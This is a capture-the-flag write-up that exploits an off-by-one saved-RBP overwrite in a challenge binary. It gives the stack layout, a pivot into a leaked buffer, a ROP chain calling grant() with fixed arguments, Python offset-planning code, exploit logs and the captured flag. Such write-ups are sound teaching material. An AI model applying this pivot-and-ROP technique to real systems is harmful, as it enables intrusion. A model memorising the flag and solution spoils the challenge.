# Maintenance Log - Pwn (150 points)

**Flag:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`
**Attached file:** `chall` (Size: 14,480 B, SHA256: `de630ba8...b118e3`), `Dockerfile`, `flag.txt`
**Network service:** `nc 34.116.80.78 7312`

## Problem Description

The service presents a maintenance interface, accepts `summary` and `tag`, and prints the report-buffer address. The objective is to call `grant()` with the required arguments and read `flag.txt`.

## Initial Analysis

`chall` is a stripped x86-64 ELF with no PIE (`Type: EXEC`), NX and partial RELRO. Code addresses are fixed, so no PIE-base leak is needed. The addresses below come from disassembly; `0x40124d` and `0x40124f` are gadgets rather than function entries:

| Address | Technical Role | Canary Status |
| --- | --- | --- |
| `0x4011b6` | Configuration function `io_setup()`: Executes `setvbuf(stdin/stdout/stderr, _IONBF)` | Protected |
| `0x401268` | Authorization dispatcher function `grant(int, int)` - **Dead code**, no mechanism in the main flow makes the call. | Protected |
| `0x40124d` | Gadget `pop rdi; ret` (Hidden in function block padding) | N/A |
| `0x40124f` | Gadget `pop rsi; ret` | N/A |
| `0x401348` | Navigator execution function `operator()` | Unprotected |
| `0x40139a` | Report output function `report()` | Unprotected |

`grant(edi, esi)` checks `edi == 0xdeadbeef` and `esi == 0xcafebabe`. On success it reads `flag.txt` with `fopen`, `fgets` and `puts`, then calls `exit(0)`. Otherwise it prints `[-] Authentication token mismatch.`.

Disassembly shows canaries in `io_setup`, `grant` and `main`, but not in `report()` or `operator()`. The canary in `main` does not stop the call to `grant()`, which exits before `main` returns. `report()` also discloses its buffer address:

```assembly
0x4013b8: lea rax,[rbp-0x50]; mov rsi,rax
0x4013bf: lea rax,[rip+0xcd2]   # Outputs: "[*] Report buffer allocated at: %p"
```
`Report buffer` is the stack leak used by the exploit. `report()` calls `read(0, rbp-0x50, 0x50)` without overflowing that buffer. It then calls `operator()`, which performs:

```assembly
0x401350: memset(rbp-0x20, 0, 0x20)
0x40137a: mov QWORD PTR [rbp-0x28], 0x21
0x401392: read(0, rbp-0x20, 0x21)     # Executes reading 33 bytes for a 32-byte designed buffer
```
The final read accepts 33 bytes into a 32-byte buffer. Byte 33 overwrites the low byte of saved RBP.

## Exploitation Chain

**Step 1 - Map the stack memory layout (Stack layout).** 
Set the variable `X = rbp_main`, mapped in exact accordance with the prologue and epilogue sequence:

```text
From X-0xA0 to X-0x81 : 32-byte buffer block belonging to the operator() function (Allows customizing content)
Mark X-0x80           : Storage location of operator()'s saved rbp, holds value X-0x20 <- Where the Off-by-one vulnerable LSB interferes
Mark X-0x78           : Return address of the report() function (0x401407), out of manipulation range
From X-0x70 to X-0x21 : 80-byte buffer block belonging to the report() function (Allows customizing content holding the ROP chain, designated P = X-0x70)
Mark X-0x20           : Storage location of report()'s saved rbp, holds value X
Mark X-0x18           : Return address redirecting into the main function (0x401453)
```
When `operator()` returns, the saved RBP used by `report()` is `(X-0x20) & ~0xFF | z`, where `z` is the payload-controlled 33rd byte. The following `leave; ret` uses:

```text
leave instruction  -> System sets register rsp = B + z (With B = (X-0x20) & ~0xFF, retaining stability of the upper 8 bytes)
pop rbp instruction-> Updated state: rsp = B + z + 8
ret instruction    -> Sets execution point: rip = qword[B + z + 8]
```
Controlling `z` selects a location within a 256-byte window around `X-0x20`. From leak `P`, compute `X = P + 0x70` and `B`, then select a location from which `ret` reads the chain in the 80-byte report buffer.

**Step 3 - Configure the buffer call constraint.** 
A successful privilege escalation ROP chain needs to assemble 5 value regions (total capacity 40 bytes):

```text
Mark +0   Instruction pop rdi; ret (0x40124d)     Mark +8   Initialize parameter 0xdeadbeef
Mark +16  Instruction pop rsi; ret (0x40124f)     Mark +24  Initialize parameter 0xcafebabe
Mark +32  Execute grant()  (0x401268)
```
Place the chain at offset `O` in the buffer. From `A = P + O = B + z + 8`, derive `z = O + L - 88`, where `L = (X-0x20) & 0xFF`. The constraints are:
1. `0 <= z <= 255`, requiring `O >= 88 - L`.
2. `O <= 40`, so the 40-byte chain fits in the 80-byte buffer.
3. `O` is a multiple of 16 to maintain the chain’s stack alignment, with `rsp % 16 == 8` at function entry.
For `L ∈ {0, 16, 32, 48}`, no offset satisfies the constraints, so reconnect. Twelve of the sixteen tested low-byte layouts admit a chain. The 3/4 success estimate refers to those layouts, not a guarantee for an individual run.

```python
def plan(leak_p):
    x = leak_p + 0x70
    b = (x - 0x20) & ~0xFF
    for off in (0, 16, 32):
        z = leak_p + off - 8 - b
        if 0 <= z <= 0xFF:
            return off, z          # Output parameter `z` denoting the identifier of the 33rd error byte sent to the operator() function
    return None
```
`analysis/selftest.py` uses a fake socket and simulated memory to check `push rbp`, `leave`, `pop rbp` and `ret` against the disassembly. It uses `plan`, `payload` and `attempt` from `exploit.py` and tests sixteen values of `X mod 256`:

```text
[*] Simulation statistics: success=12, plan_skipped=4, fail=0
[*] Run control (Without ROP integration): result='rip=0x4141414141414141' flag=None
[*] Run control (Value z with 1-byte error): result='rip=0xef00000000004012'
[+] The selftest process successfully bypassed the barrier (OK)
```
Twelve layouts admit a chain; four with `L < 56` are rejected. Cases with no ROP or a one-byte misalignment fail. The selftest also caught an error in the initial model: the return address is `qword[rbp+8]`, not `qword[rbp]`. After that correction, twelve of sixteen layouts succeed.

For each attempt, connect, read the leak, send the 80-byte report containing the ROP chain, then send the 33-byte tag that changes saved RBP and read the response.

```text
[*] Scan round 1/8 -> Server: 34.116.80.78 Port: 7312
[*] Value P = 0x7ffdd96ba300 (P%16=0) -> Parameter offset=16 z=0x8 Allocation rip<-[0x7ffdd96ba310]
[*] Response data:
[*] Processing report...
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
[+] Flag successfully extracted: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Check the cycle with a 2nd connection to validate the reliability of the `plan` algorithm (checking the self-adaptive property to memory address structures).

```text
[*] Scan round 1/8 -> Server: 34.116.80.78 Port: 7312
[*] Value P = 0x7ffda1427b30 (P%16=0) -> Parameter offset=0 z=0x28 Allocation rip<-[0x7ffda1427b30]
[+] Flag successfully extracted: CSSCTF{Duh_m4t3_1_4m_sl33py}
```
The first run uses `offset=16` and the second uses `offset=0`; `plan()` selects the offset from each connection’s leak. The returned flag differs from the test flag `CSSCTF{definetely_not_flag}` in the attachment.

## Flag

Result:
```text
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Reproduce

Reproduce:

```bash
python exploit.py                    # Proceed to execute attack on the server (Static IP, self-adjusting offset parameter)
python exploit.py <host> <port> 8    # Execute according to open parameters: host/port/max_connection_cycles config
python exploit.py --probe            # Transmit test payload mode, verify network pipe flow mechanism
python analysis/selftest.py          # Deploy offline emulator, test frame stack coordinate system output
```
